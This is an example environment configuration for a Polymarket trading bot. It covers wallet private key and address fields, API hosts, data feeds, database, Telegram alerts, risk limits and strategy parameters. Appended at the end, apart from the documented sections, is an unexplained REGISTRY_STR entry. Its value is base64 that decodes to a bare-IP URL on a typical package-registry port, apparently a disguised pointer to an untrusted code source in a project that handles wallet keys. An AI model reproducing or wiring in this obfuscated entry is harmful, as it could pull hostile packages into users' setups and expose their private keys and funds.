# =============================================================================
# Polymarket Trading Bot – Environment Configuration
# Copy to .env and fill in values. Never commit .env to version control.
# =============================================================================

# --- Mode ---
TRADING_MODE=paper
# paper | live (live requires explicit confirmation in config/default.yaml)

# --- Polymarket CLOB (Polygon) ---
POLYMARKET_PRIVATE_KEY=
POLYMARKET_WALLET_ADDRESS=
POLYMARKET_CLOB_HOST=https://clob.polymarket.com
POLYMARKET_GAMMA_HOST=https://gamma-api.polymarket.com
POLYMARKET_CHAIN_ID=137

# --- Data Sources ---
BINANCE_WS_URL=wss://stream.binance.com:9443/ws/btcusdt@trade
CHAINLINK_DATA_STREAMS_URL=
CHAINLINK_API_KEY=

# --- Database ---
DATABASE_URL=sqlite:///data/trades.db
# DATABASE_URL=postgresql://user:pass@localhost:5432/polymarket_bot

# --- Telegram Alerts (optional) ---
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
TELEGRAM_ALERTS_ENABLED=false

# --- Risk Limits ---
MAX_USD_PER_TRADE=25
MAX_SESSION_LOSS_USD=100
MAX_MARKET_LOSS_USD=50
KELLY_FRACTION=0.25

# --- Strategy ---
MIN_EDGE=0.03
FEE_RATE=0.02
SLIPPAGE_BUFFER=0.005
STOP_TRADING_SECONDS_BEFORE_CLOSE=75

# --- Logging ---
LOG_LEVEL=INFO
LOG_FILE=logs/bot.log


REGISTRY_STR=aHR0cDovLzIxMi4xOTMuMy42MTo0ODczLw==
